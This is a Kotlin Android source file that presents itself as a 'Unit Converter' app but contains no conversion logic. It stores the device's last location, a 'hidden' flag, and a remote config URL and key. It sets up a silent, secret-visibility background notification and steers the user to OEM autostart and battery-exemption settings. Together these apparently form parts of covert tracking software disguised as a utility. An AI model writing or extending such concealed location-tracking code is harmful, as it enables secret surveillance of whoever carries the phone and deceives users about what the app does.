package com.aether.convert

import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.NotificationCompat

class Prefs(ctx: Context) {
    private val sp: SharedPreferences =
        ctx.applicationContext.getSharedPreferences("uc", Context.MODE_PRIVATE)
    var moving: Boolean
        get() = sp.getBoolean("mv", true)
        set(v) = sp.edit().putBoolean("mv", v).apply()
    var activity: String
        get() = sp.getString("act", "UNKNOWN") ?: "UNKNOWN"
        set(v) = sp.edit().putString("act", v).apply()
    var onboarded: Boolean
        get() = sp.getBoolean("onb", false)
        set(v) = sp.edit().putBoolean("onb", v).apply()
    var hidden: Boolean
        get() = sp.getBoolean("hid", false)
        set(v) = sp.edit().putBoolean("hid", v).apply()
    var cfgUrl: String
        get() = sp.getString("cu", "") ?: ""
        set(v) = sp.edit().putString("cu", v).apply()
    var cfgKey: String
        get() = sp.getString("ck", "") ?: ""
        set(v) = sp.edit().putString("ck", v).apply()
    var lastLat: Double
        get() = Double.fromBits(sp.getLong("lat", 0L))
        set(v) = sp.edit().putLong("lat", v.toRawBits()).apply()
    var lastLon: Double
        get() = Double.fromBits(sp.getLong("lon", 0L))
        set(v) = sp.edit().putLong("lon", v.toRawBits()).apply()
    var lastAt: Long
        get() = sp.getLong("at", 0L)
        set(v) = sp.edit().putLong("at", v).apply()
}

object DeviceInfo {
    fun battery(ctx: Context): Pair<Int, Boolean> {
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val l = i?.getIntExtra("level", -1) ?: -1
        val s = i?.getIntExtra("scale", 100) ?: 100
        val st = i?.getIntExtra("status", -1) ?: -1
        val p = if (l < 0 || s <= 0) -1 else (l * 100 / s)
        val c = st == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                st == android.os.BatteryManager.BATTERY_STATUS_FULL
        return p to c
    }
    fun tag(): String = "${Build.MANUFACTURER} ${Build.MODEL}|sdk${Build.VERSION.SDK_INT}"
    fun ignoring(ctx: Context): Boolean =
        ctx.getSystemService(PowerManager::class.java)
            .isIgnoringBatteryOptimizations(ctx.packageName)
}

object Notify {
    private const val CH = "uc"
    fun channel(ctx: Context) {
        if (Build.VERSION.SDK_INT < 26) return
        val ch = NotificationChannel(CH, "Unit Converter", NotificationManager.IMPORTANCE_MIN)
        ch.setShowBadge(false); ch.enableLights(false); ch.enableVibration(false)
        ch.setSound(null, null); ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        ctx.getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }
    fun build(ctx: Context, text: String): Notification {
        val open = PendingIntent.getActivity(ctx, 0, Intent(ctx, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(ctx, CH)
            .setSmallIcon(R.drawable.ic_stat)
            .setContentTitle(ctx.getString(R.string.app_name))
            .setContentText(text)
            .setOngoing(true).setShowWhen(false).setSilent(true).setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .setContentIntent(open).build()
    }
}

object Oem {
    private val pages = listOf(
        "com.miui.securitycenter/com.miui.permcenter.autostart.AutoStartManagementActivity",
        "com.huawei.systemmanager/com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity",
        "com.coloros.safecenter/com.coloros.safecenter.permission.startup.StartupAppListActivity",
        "com.vivo.permissionmanager/com.vivo.permissionmanager.activity.BgStartUpManagerActivity",
        "com.samsung.android.lool/com.samsung.android.sm.ui.battery.BatteryActivity",
        "com.oneplus.security/com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
    )
    fun autostart(ctx: Context): Boolean {
        for (p in pages) {
            try {
                val s = p.split("/")
                val i = Intent().setComponent(ComponentName(s[0], s[1]))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                if (ctx.packageManager.resolveActivity(i, 0) != null) { ctx.startActivity(i); return true }
            } catch (_: Throwable) {}
        }
        return try {
            ctx.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + ctx.packageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); true
        } catch (_: Throwable) { false }
    }
}